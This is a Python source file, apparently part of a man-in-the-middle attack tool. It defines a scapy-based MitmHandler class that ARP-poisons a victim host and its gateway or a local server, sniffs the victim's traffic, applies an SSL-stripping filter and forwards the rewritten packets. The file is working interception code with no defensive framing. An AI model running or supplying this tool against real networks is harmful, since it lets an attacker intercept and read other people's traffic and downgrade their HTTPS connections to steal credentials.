# Spoof gateway
# Listen for request from client
# do either ARP if server on local network, otherwise gateway is already spoofed
# Complete tcp handshake
# Wait for http
# If ssl stripping, start http connection using ssl stripping
# If not, just start https connection

import scapy.all as sc
import threading
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from SSLFilter import SSLStripFilter
from Arp_poisening import ARPPoisoner

class MitmHandler:

    
    def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger, target_ip=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        
        # Determine upstream (Gateway or Local Server)
        self.upstream_ip = gateway_ip
        self.upstream_mac = self.get_mac(gateway_ip) # Default
        
        if target_ip:
            target_mac = self.get_mac(target_ip)
            if target_mac:
                self.upstream_ip = target_ip
                self.upstream_mac = target_mac
                logger(f"Target {target_ip} is local. Spoofing it directly.")
            else:
                logger(f"Target {target_ip} is remote. Spoofing gateway.")

        self.gateway_mac = self.get_mac(gateway_ip)
        self.victim_mac = self.get_mac(victim_ip)
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip
        self.attacker_ipv6 = attacker_ipv6
        self.running = False
        self.logger = logger
        self.filters = []
        self.add_filter(SSLStripFilter(self.victim_ip, self.logger))
        
        # Initialize ARP Poisoner to spoof upstream
        self.arp_poisoner = ARPPoisoner(
            self.interface, 
            self.victim_ip, 
            self.upstream_ip, 
            self.attacker_mac, 
            self.logger
        )

    def add_filter(self, filter_handler):
        self.filters.append(filter_handler)

    # Get mac adress of a given IP adress
    #ToDo extract this to helper method
    def get_mac(self, ip):
        arp = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp
        answered = sc.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
        for _, received in answered:
            return received.hwsrc
        return None
    
    def start(self):
        if(self.running):
            return
        
        self.running = True

        # Start ARP spoofing
        self.arp_poisoner.start()

        self.sniffing_thread = threading.Thread(
            target=self.sniffing_loop
        )
        self.sniffing_thread.daemon = True
        self.sniffing_thread.start()

    def stop(self):
        self.running = False

        # Stop ARP spoofing
        if hasattr(self, 'arp_poisoner'):
            self.arp_poisoner.stop()

        if self.sniffing_thread:
            self.sniffing_thread.join(timeout=10)

    def sniffing_loop(self):
        try:
            sc.sniff(
                iface=self.interface,
                prn=self.packet_handler,
                # Create a filter that says the packets are not coming from us, and also create a filter that the packets come from / go to the victim.
                filter=f"ip and ether src not {self.attacker_mac} and (src host {self.victim_ip} or dst host {self.victim_ip})",
                store=0,
                stop_filter=lambda _: not self.running
            )
        except Exception as e:
            self.logger(f"{e}")

    def packet_handler(self, packet):
        # Do not handle these packets.
        if not packet.haslayer(IP):
            return
        if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
            return
        
        # Listen for request from client
        if packet.haslayer(TCP) and packet[TCP].flags == 'S' and packet[IP].src == self.victim_ip:
            self.logger(f"Received connection request from client {self.victim_ip} to {packet[IP].dst}")

        forward_packet = True
        for filter_handler in self.filters:
            try:
                # If the filter handler already handled the packet, we should no longer forward it later.
                if filter_handler(packet):
                    forward_packet = False
                    break
            except Exception as e:
                self.logger(f"{e}")

        if forward_packet:
            self.packet_forwarder(packet)

    def packet_forwarder(self, packet):
        try:
            # Run some checks if we even need to forward this packet
            if not packet.haslayer(Ether):
                return

            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
            elif packet.haslayer(IPv6):
                src_ip = packet[IPv6].src
                dst_ip = packet[IPv6].dst
            else:
                return

            # If we are the destination, ignore.
            if (dst_ip == self.attacker_ip) or (self.attacker_ipv6 and dst_ip == self.attacker_ipv6):
                return

            pkt = packet.copy()

            # Clear checksums before forwarding
            if pkt.haslayer(IP):
                del pkt[IP].chksum
                del pkt[IP].len

            if pkt.haslayer(TCP):
                del pkt[TCP].chksum
            if pkt.haslayer(UDP):
                del pkt[UDP].chksum
            forwarded = False

            # From victim to gateway
            if src_ip == self.victim_ip:
                # Pretend that we sent the packet, and send it to the gateway
                pkt[Ether].dst = self.upstream_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            # From gateway to the victim
            elif dst_ip == self.victim_ip:
                # Pretend that we sent the packet, and send it to the victim
                pkt[Ether].dst = self.victim_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            if forwarded:
                sc.sendp(pkt, verbose=0, iface=self.interface)

        except Exception as e:
            self.logger(f"{e}")
